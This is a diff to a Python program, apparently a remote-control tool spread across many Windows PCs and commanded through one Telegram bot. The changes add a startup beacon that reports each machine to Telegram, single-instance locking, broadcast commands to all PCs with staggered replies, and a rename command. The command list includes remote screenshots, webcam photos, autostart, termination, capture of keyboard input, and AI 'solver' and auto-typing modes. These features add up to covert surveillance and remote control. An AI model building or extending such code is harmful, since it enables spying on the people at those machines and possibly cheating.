@@ -157,15 +157,40 @@ BASE_DIR = get_base_dir()
 
 # ─── SINGLE INSTANCE MUTEX ────────────────────────────────────────────────────
 SINGLE_INSTANCE_MUTEX = None
+SINGLE_INSTANCE_LOCK_FILE = None
 
 def acquire_single_instance_mutex():
-    global SINGLE_INSTANCE_MUTEX
+    global SINGLE_INSTANCE_MUTEX, SINGLE_INSTANCE_LOCK_FILE
     if IS_WINDOWS:
+        # Tier 1: Win32 Named Mutex in Local\ namespace (accessible to standard non-admin accounts)
         try:
-            mutex_name = f"Global\\OmniAssistant_{PC_NAME}"
-            SINGLE_INSTANCE_MUTEX = ctypes.windll.kernel32.CreateMutexW(None, False, mutex_name)
-            if ctypes.windll.kernel32.GetLastError() == 183:
+            safe_id = hashlib.md5(f"OmniAssistant_{PC_NAME}".encode("utf-8")).hexdigest()
+            mutex_name = f"Local\\OmniAssistantLock_{safe_id}"
+            handle = ctypes.windll.kernel32.CreateMutexW(None, False, mutex_name)
+            last_err = ctypes.windll.kernel32.GetLastError()
+            if last_err in (183, 5) or handle == 0:  # 183 = ERROR_ALREADY_EXISTS, 5 = ACCESS_DENIED
+                log(f"Single instance protection: Mutex already exists (err={last_err}). Exiting.")
                 sys.exit(0)
+            SINGLE_INSTANCE_MUTEX = handle
+        except SystemExit:
+            raise
+        except Exception as e:
+            log(f"Mutex creation notice: {e}")
+
+        # Tier 2: Exclusive lockfile in %TEMP% using msvcrt (kernel file locking)
+        try:
+            import tempfile
+            import msvcrt
+            safe_id = hashlib.md5(f"OmniAssistant_{PC_NAME}".encode("utf-8")).hexdigest()[:12]
+            lock_path = os.path.join(tempfile.gettempdir(), f"omni_{safe_id}.lock")
+            SINGLE_INSTANCE_LOCK_FILE = open(lock_path, "a+b")
+            try:
+                msvcrt.locking(SINGLE_INSTANCE_LOCK_FILE.fileno(), msvcrt.LK_NBLCK, 1)
+            except (IOError, OSError):
+                log("Single instance protection: Lockfile already held by another process. Exiting.")
+                sys.exit(0)
+        except SystemExit:
+            raise
         except Exception:
             pass
 
@@ -228,7 +253,7 @@ def load_config():
             for k in ("api_key_1", "api_key_2", "api_key_3"):
                 if k not in cfg:
                     cfg[k] = _NK
-            if "pc_name" not in cfg:
+            if "pc_name" not in cfg or not (cfg.get("pc_name") or "").strip():
                 cfg["pc_name"] = PC_NAME
             if "target_logins" not in cfg:
                 cfg["target_logins"] = []
@@ -291,7 +316,8 @@ class AssistantState:
         self.busy = False
         self.lock = threading.Lock()
 
-        self.pc_name        = config_data.get("pc_name", PC_NAME)
+        cfg_name = str(config_data.get("pc_name") or "").strip()
+        self.pc_name        = cfg_name if (cfg_name and cfg_name.lower() not in ("auto", "default", "none")) else PC_NAME
         self.target_logins  = set(config_data.get("target_logins", []))
         self.log_watch_path = config_data.get("log_watch_path", DEFAULT_CONFIG["log_watch_path"])
         self.is_running     = True
@@ -411,19 +437,28 @@ def tg_send_message(text, parse_mode="HTML"):
         if not token or not chat_id:
             return
         url = f"https://api.telegram.org/bot{token}/sendMessage"
-        try:
-            r = requests.post(url, json={"chat_id": chat_id, "text": text, "parse_mode": parse_mode}, timeout=8)
-            if r.status_code == 429:
-                try:
-                    wait_s = r.json().get("parameters", {}).get("retry_after", 3)
-                except Exception:
-                    wait_s = 3
-                time.sleep(wait_s)
-                requests.post(url, json={"chat_id": chat_id, "text": text, "parse_mode": parse_mode}, timeout=8)
-            elif r.status_code != 200 and parse_mode:
-                requests.post(url, json={"chat_id": chat_id, "text": text}, timeout=8)
-        except Exception:
-            pass
+        for attempt in range(3):
+            try:
+                payload = {"chat_id": chat_id, "text": text}
+                if parse_mode:
+                    payload["parse_mode"] = parse_mode
+                r = requests.post(url, json=payload, timeout=8)
+                if r.status_code == 200:
+                    return
+                if r.status_code == 429:
+                    try:
+                        wait_s = float(r.json().get("parameters", {}).get("retry_after", 3))
+                    except Exception:
+                        wait_s = 3.0
+                    time.sleep(wait_s + random.uniform(0.2, 0.7))
+                    continue
+                if r.status_code != 200 and parse_mode:
+                    r2 = requests.post(url, json={"chat_id": chat_id, "text": text}, timeout=8)
+                    if r2.status_code == 200:
+                        return
+                break
+            except Exception:
+                time.sleep(1.0)
     threading.Thread(target=_worker, daemon=True).start()
 
 def tg_send_photo(photo_bytes, caption="", parse_mode="HTML"):
@@ -1160,19 +1195,36 @@ def tg_bot_poller():
     last_update_id = None
     log(f"Telegram poller started on {state.pc_name}")
 
+    # Startup announcement in Telegram with small randomized delay
+    def _send_startup():
+        time.sleep(random.uniform(0.8, 2.0))
+        tg_send_message(
+            f"🟢 <b>ПК ПОДКЛЮЧИЛСЯ К СЕТИ!</b>\n"
+            f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+            f"🖥 ПК: <code>{state.pc_name}</code>\n"
+            f"🎯 Режим: <b>{state.mode}</b>\n"
+            f"🔐 Солвер: <b>{'✅ Готов' if state.solver_unlocked else '🔒 Заблокирован'}</b>\n"
+            f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+            f"💡 <i>Список всех ПК онлайн: /list_pc</i>"
+        )
+    threading.Thread(target=_send_startup, daemon=True).start()
+
     while state.is_running:
         try:
             token  = getattr(state, "tg_bot_token", TG_BOT_TOKEN)
             url    = f"https://api.telegram.org/bot{token}/getUpdates"
-            # Для 48 ПК запрашиваем очередь с мягким таймаутом
-            params = {"offset": -30, "timeout": 1}
-            resp = requests.get(url, params=params, timeout=8)
+            # timeout=0 eliminates HTTP 409 Conflict across multiple PCs polling the same bot token
+            params = {"offset": -50, "timeout": 0}
+            resp = requests.get(url, params=params, timeout=10)
             if resp.status_code == 429:
                 try:
-                    retry_after = resp.json().get("parameters", {}).get("retry_after", 5)
+                    retry_after = resp.json().get("parameters", {}).get("retry_after", 4)
                 except Exception:
-                    retry_after = 5
+                    retry_after = 4
                 time.sleep(retry_after)
+                continue
+            if resp.status_code == 409:
+                time.sleep(random.uniform(1.0, 2.5))
                 continue
             if resp.status_code != 200:
                 time.sleep(2)
@@ -1186,7 +1238,7 @@ def tg_bot_poller():
             if last_update_id is None:
                 # При первом запуске пропускаем старые сообщения
                 last_update_id = max((u.get("update_id", 0) for u in results), default=0)
-                time.sleep(random.uniform(1.0, 3.0))
+                time.sleep(random.uniform(1.0, 2.5))
                 continue
 
             for update in results:
@@ -1216,8 +1268,12 @@ def tg_bot_poller():
                     pl = p.lower()
                     if pl.startswith("@"):
                         tag = pl[1:]
-                        if tag not in ("all", "все", "bot"):
+                        if tag in ("all", "все", "bot", "everybody", "*"):
+                            pass  # broadcast to all
+                        else:
                             target_pc = tag
+                    elif pl in ("all", "все") and len(parts) > 1:
+                        pass  # broadcast marker
                     elif pl == pc_lower:
                         target_pc = pc_lower
                     else:
@@ -1230,6 +1286,10 @@ def tg_bot_poller():
 
                 cmd  = clean_tokens[0].lower().split('@')[0]
                 args = clean_tokens[1:]
+
+                # Stagger responses for broadcast mass commands to prevent Telegram 429 rate limit
+                if target_pc is None and cmd in ("/list_pc", "/status", "/solver", "/python", "/typer_py", "/cpp", "/typer_cpp", "/pass", "/setpass", "/lock", "/terminate", "/autostart"):
+                    time.sleep(random.uniform(0.1, 1.5))
 
                 # ── /start /help ──────────────────────────────────
                 if cmd in ("/start", "/help"):
@@ -1244,15 +1304,16 @@ def tg_bot_poller():
                         f"⚡ /autostart <code>on|off</code> — автозапуск\n"
                         f"💀 /terminate   — завершить процесс\n"
                         f"🌐 /list_pc     — online PCs\n"
+                        f"✏️ /rename <code>&lt;имя&gt;</code> — переименовать ПК\n"
                         f"\n<b>📸 MEDIA &amp; SCREEN</b>\n"
                         f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                         f"🖼 /screenshot  — screen capture\n"
                         f"📷 /webcam      — webcam photo\n"
-                        f"\n<b>\U0001f510 SOLVER PASSWORD</b>\n"
-                        f"\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n"
-                        f"👂 /pass <code>[код]</code>      \u2014 ждать ввод кода с клавиатуры\n"
-                        f"\U0001f510 /setpass &lt;пароль&gt;   \u2014 установить общий пароль\n"
-                        f"\U0001f512 /lock              \u2014 заблокировать солвер\n"
+                        f"\n<b>🔐 SOLVER PASSWORD</b>\n"
+                        f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+                        f"👂 /pass <code>[код]</code>      — ждать ввод кода с клавиатуры\n"
+                        f"🔐 /setpass &lt;пароль&gt;   — установить общий пароль\n"
+                        f"🔒 /lock              — заблокировать солвер\n"
                         f"\n<b>🔑 MODES &amp; KEYS</b>\n"
                         f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                         f"🎯 /solver          — Solver mode\n"
@@ -1262,7 +1323,7 @@ def tg_bot_poller():
                         f"🔄 /change key <code>1 &lt;key&gt;</code> — set API key\n"
                         f"🗑️ /del key <code>1|2|3|all</code> — delete key\n"
                         f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
-                        f"💡 Таргет: <code>@Имя /команда</code>"
+                        f"💡 Таргет: <code>@Имя /команда</code> или <code>/команда</code> для всех"
                     )
 
                 # ── /list_pc ──────────────────────────────────────
@@ -1271,12 +1332,25 @@ def tg_bot_poller():
                     si = "🔒" if not getattr(state, "solver_unlocked", False) else ("⏳" if state.busy else "✅")
                     ss = "Locked" if not getattr(state, "solver_unlocked", False) else ("Busy" if state.busy else "Ready")
                     tg_send_message(
-                        f"💻 <b>ONLINE PC:</b>\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
-                        f"🖥 <code>{state.pc_name}</code>\n"
-                        f"{me} Mode: <b>{state.mode}</b>\n"
-                        f"{si} State: <b>{ss}</b>\n"
-                        f"━━━━━━━━━━━━━━━━━━━━━━━━━━"
+                        f"💻 <b>ONLINE PC:</b> <code>{state.pc_name}</code>\n"
+                        f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+                        f"{me} Режим: <b>{state.mode}</b>\n"
+                        f"{si} Состояние: <b>{ss}</b>"
                     )
+
+                # ── /rename /setname ──────────────────────────────
+                elif cmd in ("/rename", "/setname", "/rename_pc", "/set_pc_name"):
+                    if not args:
+                        tg_send_message(f"⚠️ [<code>{state.pc_name}</code>] Укажите имя: <code>@{state.pc_name} /rename &lt;новое_имя&gt;</code>")
+                    else:
+                        old_name = state.pc_name
+                        new_name = args[0].strip()
+                        with state.lock:
+                            state.pc_name = new_name
+                            cfg = load_config()
+                            cfg["pc_name"] = new_name
+                            save_config(cfg)
+                        tg_send_message(f"✅ ПК переименован:\n<code>{old_name}</code> ➔ <b><code>{new_name}</code></b>")
 
                 # ── /terminate ────────────────────────────────────
                 elif cmd in ("/terminate", "terminate", "/kill", "kill", "/терминате", "терминате", "/exit", "exit", "/стоп", "стоп"):
@@ -1465,23 +1539,23 @@ def tg_bot_poller():
                 # ── /solver /python /cpp ──────────────────────────
                 elif cmd == "/solver":
                     with state.lock: state.mode = "SOLVER"
-                    tg_send_message("✅ Mode: <b>SOLVER</b>")
+                    tg_send_message(f"✅ [<code>{state.pc_name}</code>] Mode: <b>SOLVER</b>")
                 elif cmd in ("/typer_py", "/python"):
                     with state.lock: state.mode = "TYPER_PYTHON"
-                    tg_send_message("✅ Mode: <b>TYPER_PYTHON</b>")
+                    tg_send_message(f"✅ [<code>{state.pc_name}</code>] Mode: <b>TYPER_PYTHON</b>")
                 elif cmd in ("/typer_cpp", "/cpp"):
                     with state.lock: state.mode = "TYPER_CPP"
-                    tg_send_message("✅ Mode: <b>TYPER_CPP</b>")
+                    tg_send_message(f"✅ [<code>{state.pc_name}</code>] Mode: <b>TYPER_CPP</b>")
 
                 # ── /key ──────────────────────────────────────────
                 elif cmd in ("/key", "/keys"):
                     sub = args[0].lower() if args else ""
                     if sub in ("1", "2", "3"):
                         ok, info = switch_api_key(int(sub))
-                        tg_send_message(f"🔑 {info}")
+                        tg_send_message(f"🔑 [<code>{state.pc_name}</code>] {info}")
                     else:
                         tg_send_message(
-                            f"🔑 <b>API KEYS:</b>\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+                            f"🔑 <b>API KEYS ({state.pc_name}):</b>\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                             f"{'👉 ' if state.active_key_index==1 else '   '}<b>#1:</b> <code>{mask_key(state.api_key_1)}</code>\n"
                             f"{'👉 ' if state.active_key_index==2 else '   '}<b>#2:</b> <code>{mask_key(state.api_key_2)}</code>\n"
                             f"{'👉 ' if state.active_key_index==3 else '   '}<b>#3:</b> <code>{mask_key(state.api_key_3)}</code>\n"
@@ -1490,10 +1564,10 @@ def tg_bot_poller():
                             f"• Change: <code>/change key 1 &lt;KEY&gt;</code>\n"
                             f"• Delete: <code>/del key 1|2|3</code>"
                         )
-            time.sleep(random.uniform(2.0, 3.5))
+            time.sleep(random.uniform(1.2, 2.2))
 
         except Exception:
-            time.sleep(3)
+            time.sleep(2.5)
 
 
 # ─── MAIN ─────────────────────────────────────────────────────────────────────
